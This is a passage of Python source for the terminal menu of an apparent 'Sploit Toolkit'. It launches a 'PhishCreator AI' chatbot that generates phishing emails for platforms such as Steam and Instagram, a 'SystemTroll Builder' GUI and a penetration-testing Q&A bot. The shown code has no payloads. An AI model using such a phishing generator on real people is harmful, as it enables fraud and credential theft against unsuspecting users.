            temp_model_path = "model.pkl"
            temp_dataset_path = "phishing_dataset_clean.csv"

            shutil.copy2(model_path, temp_model_path)
            shutil.copy2(dataset_path, temp_dataset_path)

            chatbot = PhishingChatBot()

            print("✅ PhishCreator AI model loaded successfully!")
            print("💬 Example platforms: steam, instagram, omegle, location")
            print("Type 'exit' to quit the chatbot.\n")

            while True:
                user_input = input("👤 You: ").strip()
                if user_input.lower() == "exit":
                    break

                if not user_input:
                    continue

                try:
                    email_text = chatbot.generate_email(user_input)
                    print(f"🤖 Bot: {email_text}\n")
                except Exception as e:
                    print(f"❌ Error: {str(e)}\n")

        except Exception as e:
            print(f"❌ Failed to load PhishCreator AI: {str(e)}")
            import traceback
            traceback.print_exc()


    def systemtroll_builder(self):
        print("\n🖥 SystemTroll Builder")
        print("=" * 50)
        print("This feature requires the GUI application.")
        print("Would you like to launch the GUI version or open the directory?")
        print("1. Launch GUI Application")
        print("2. Open GUI Directory")
        print("3. Cancel")

        choice = input("Choose option (1-3): ").strip()

        if choice == "1":
            try:
                base_dir = os.path.dirname(os.path.abspath(__file__))
                gui_path = os.path.join(base_dir, "GUI", "Application.py")

                if os.path.exists(gui_path):
                    print("🚀 Launching GUI Application...")
                    os.system(f'python "{gui_path}"')
                else:
                    print("❌ GUI application not found.")
            except Exception as e:
                print(f"❌ Error launching GUI: {str(e)}")

        elif choice == "2":
            try:
                base_dir = os.path.dirname(os.path.abspath(__file__))
                gui_dir = os.path.join(base_dir, "GUI")

                if os.path.exists(gui_dir):
                    print("📂 Opening GUI directory...")
                    self.open_directory(gui_dir)
                else:
                    print("❌ GUI directory not found.")
            except Exception as e:
                print(f"❌ Error opening directory: {str(e)}")

        else:
            print("ℹ️ Operation cancelled.")
            print("You can manually access the GUI from the GUI/Application.py directory")

    def sploit_chatbot(self):
        print("\n🔍 Sploit ChatBot")
        print("=" * 50)

        try:
            base_dir = os.path.dirname(os.path.abspath(__file__))

            sploit_chatbot_dir = None
            for item in os.listdir(base_dir):
                if item.lower() == "sploit_chatbot":
                    sploit_chatbot_dir = os.path.join(base_dir, item)
                    break

            if sploit_chatbot_dir is None:
                print("❌ Sploit_Chatbot directory not found!")
                print("📂 Available directories:")
                for item in os.listdir(base_dir):
                    if os.path.isdir(os.path.join(base_dir, item)):
                        print(f"  - {item}")
                return

            test_code_dir = None
            for item in os.listdir(sploit_chatbot_dir):
                if os.path.isdir(os.path.join(sploit_chatbot_dir, item)) and item.lower() == "test_code":
                    test_code_dir = os.path.join(sploit_chatbot_dir, item)
                    break

            if test_code_dir is None:
                print("❌ Test_Code directory not found!")
                print(f"📂 Contents of {sploit_chatbot_dir}:")
                for item in os.listdir(sploit_chatbot_dir):
                    item_path = os.path.join(sploit_chatbot_dir, item)
                    if os.path.isdir(item_path):
                        print(f"  📁 {item}")
                    else:
                        print(f"  📄 {item}")
                return

            print(f"✅ Test_Code directory found: {test_code_dir}")

            model_path = None
            questions_path = None

            print(f"📂 Contents of Test_Code:")
            for item in os.listdir(test_code_dir):
                item_path = os.path.join(test_code_dir, item)
                if os.path.isfile(item_path):
                    print(f"  - {item}")
                    file_lower = item.lower()
                    if file_lower == "model1.pkl":
                        model_path = item_path
                    elif file_lower == "questions.csv":
                        questions_path = item_path

            if model_path is None:
                print("❌ model1.pkl file not found!")
                return

            if questions_path is None:
                print("❌ Questions.csv file not found!")
                return

            print(f"✅ Model found: {os.path.basename(model_path)}")
            print(f"✅ Questions found: {os.path.basename(questions_path)}")

            original_dir = os.getcwd()
            os.chdir(test_code_dir)

            try:
                class CustomTestChatBot:
                    def __init__(self, model_path, questions_path):
                        self.model = joblib.load(model_path)
                        self.data = pd.read_csv(questions_path)
                        self.vectorizer = TfidfVectorizer()
                        self.vectorizer.fit(self.data["question"].values)

                    def Test_Model(self):
                        print("Sploit ChatBot is ready!")
                        print("Type 'exit' to quit.")
                        try:
                            while True:
                                user_input = input("\n👤 You: ").strip().lower()
                                if user_input == "exit":
                                    print("Exiting chatbot...")
                                    break

                                if not user_input:
                                    continue

                                resub = re.sub(r"[^\w\s]", "", user_input)

                                Predicted = self.model.predict([resub])[0]

                                user_vec = self.vectorizer.transform([user_input])
                                questions_vec = self.vectorizer.transform(self.data["question"].values)
                                similarities = cosine_similarity(user_vec, questions_vec).flatten()
                                max_sim_idx = similarities.argmax()
                                max_sim_score = similarities[max_sim_idx]

                                if max_sim_score >= 0.7:
                                    answer = self.data["answer"].iloc[max_sim_idx]
                                    print(f"🤖 Sploit: {answer}")
                                else:
                                    print(f"🤖 Sploit: {Predicted}")

                        except Exception as e:
                            print(f"❌ Error generating answer: {e}")

                chatbot = CustomTestChatBot("model1.pkl", "Questions.csv")
                print("✅ Sploit ChatBot loaded successfully!")
                print("💬 Type your questions about penetration testing and security.")

                chatbot.Test_Model()

            finally:
                os.chdir(original_dir)

        except Exception as e:
            print(f"❌ Failed to load Sploit ChatBot: {str(e)}")
            import traceback
            traceback.print_exc()


    def Run_GUI(self):
        try:
            base_dir = os.path.dirname(os.path.abspath(__file__))
            gui_path = os.path.join(base_dir, "GUI", "Application.py")

            if not os.path.exists(gui_path):
                print("❌ GUI application not found!")
                print(f"📁 Expected path: {gui_path}")

                possible_paths = [
                    os.path.join(base_dir, "Application.py"),
                    os.path.join(base_dir, "gui.py"),
                    os.path.join(base_dir, "main.py"),
                    os.path.join(base_dir, "GUI.py"),
                ]

                for path in possible_paths:
                    if os.path.exists(path):
                        gui_path = path
                        print(f"✅ Found GUI at: {gui_path}")
                        break
                else:
                    print("❌ Could not find GUI application.")
                    return False

            print("🚀 Launching GUI Application...")
            print(f"📟 Platform: {sys.platform} ({os.name})")

            if os.name == 'nt':
                result = os.system(f'python "{gui_path}"')
            else:
                result = os.system(f'python3 "{gui_path}"')

            if result == 0:
                print("✅ GUI application launched successfully!")
                return True
            else:
                print("❌ Failed to launch GUI application.")
                return False

        except Exception as e:
            print(f"❌ Error launching GUI: {str(e)}")
            import traceback
            traceback.print_exc()
            return False



    def settings(self):
        print("\n⚙️ Settings")
        print("=" * 50)
        print("Settings functionality is currently limited in terminal mode.")
        print("Please edit the sploit_config.ini file manually for configuration.")

    def about(self):
        print("\n📚 About Sploit Toolkit")
        print("=" * 50)
        print("🔐 Sploit Toolkit - Version 1.0.0")
        print("🌐 Comprehensive Security Testing Suite")
        print("👨‍💻 Developed by AUX-441 Team")
        print("📖 Documentation: https://github.com/AUX-441/Sploit/wiki")
        print("🐛 Issues: https://github.com/AUX-441/Sploit/issues")
        print("\n📋 Features:")
        print("  - Web Security Testing (SQLi, XSS, etc.)")
        print("  - Network & Infrastructure Analysis")
        print("  - Penetration Testing Tools")
        print("  - AI-Powered Chatbots for security assistance")
        print("  - Educational and authorized testing purposes only")

    def stop_current_module(self):
        if self.current_module:
            self.stop_flag["stop"] = True
            print(f"[!] Stopping current module ({self.current_module})...")
        else:
            print("[!] No module is currently running.")

    def run(self):
        self.clear_screen()
        self.print_banner()

        while self.running:
            self.print_menu()
            choice = self.get_user_choice()

            if choice == -1:
                continue

            self.run_module(choice)

            if self.running and choice != 0:
                input("\nPress Enter to continue...")
                self.clear_screen()
                self.print_banner()


def main():
    parser = argparse.ArgumentParser(description="Sploit Toolkit - Terminal Mode")
    parser.add_argument("-m", "--module", type=int, help="Run specific module directly")
    parser.add_argument("-u", "--url", help="Target URL for modules that require it")
    args = parser.parse_args()

    terminal = SploitTerminal()

    if args.module is not None:
        if args.url:
            if args.module in [1, 2, 3, 4, 5, 6, 8, 9, 10, 11, 12]:
                print(f"Running module {args.module} on {args.url}")
            else:
                print(f"Module {args.module} doesn't require a URL parameter")
        else:
            terminal.run_module(args.module)
    else:
        terminal.run()


if __name__ == "__main__":
    main()
